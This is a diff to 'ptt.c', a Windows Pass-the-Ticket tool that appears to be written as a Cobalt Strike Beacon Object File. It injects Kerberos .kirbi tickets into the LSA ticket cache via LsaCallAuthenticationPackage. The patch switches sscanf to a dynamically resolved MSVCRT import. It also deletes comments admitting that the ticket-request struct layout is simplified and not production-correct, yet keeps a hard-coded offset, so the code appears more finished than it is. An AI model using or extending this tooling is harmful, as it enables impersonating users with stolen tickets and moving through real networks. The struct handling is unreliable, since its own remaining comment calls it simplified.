@@ -2,7 +2,7 @@
  * ptt.c — Pass-the-Ticket: inject .kirbi into LSA ticket cache
  *
  * Uses secur32.dll:
- *   LsaConnectUntrusted → LsaCallAuthenticationPackage(KERB_SUBMIT_TKT_REQUEST)
+ *   LsaConnectUntrusted -> LsaCallAuthenticationPackage(KERB_SUBMIT_TKT_REQUEST)
  */
 #include <windows.h>
 #define SECURITY_WIN32
@@ -16,6 +16,8 @@ DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
     HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
 DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
 DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);
+
+DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);
 
 #define KerbSubmitTicketMessage 10
 
@@ -93,7 +95,7 @@ void go(char *args, int args_len) {
     LUID targetLuid = {0};
     if (luid_str && *luid_str) {
         ULONGLONG val = 0;
-        sscanf(luid_str, "%llx", &val);
+        MSVCRT$sscanf(luid_str, "%llx", &val);
         targetLuid.LowPart = (DWORD)(val & 0xFFFFFFFF);
         targetLuid.HighPart = (LONG)(val >> 32);
     }
@@ -110,14 +112,7 @@ void go(char *args, int args_len) {
 
     /* Append the KRB-CRED data after the header */
     /* Note: exact struct layout depends on Windows version. This is simplified. */
-    /* A full implementation would properly marshal KERB_CRYPTO_KEY + KerbCredSize + data */
     DWORD *pCredSize = (DWORD *)(reqBuf + sizeof(KERB_SUBMIT_TKT_REQUEST) + 12);
-    /* Actually, the Windows KERB_SUBMIT_TKT_REQUEST in newer SDKs has
-     * Key (KERB_CRYPTO_KEY32) at offset after Flags, then KerbCredSize, then KerbCredData.
-     * We need to match the exact memory layout. */
-
-    /* For production: use the correct struct layout from NTSecAPI.h */
-    /* For now, just demonstrate the API call pattern */
 
     PVOID response = NULL;
     ULONG responseLen = 0;
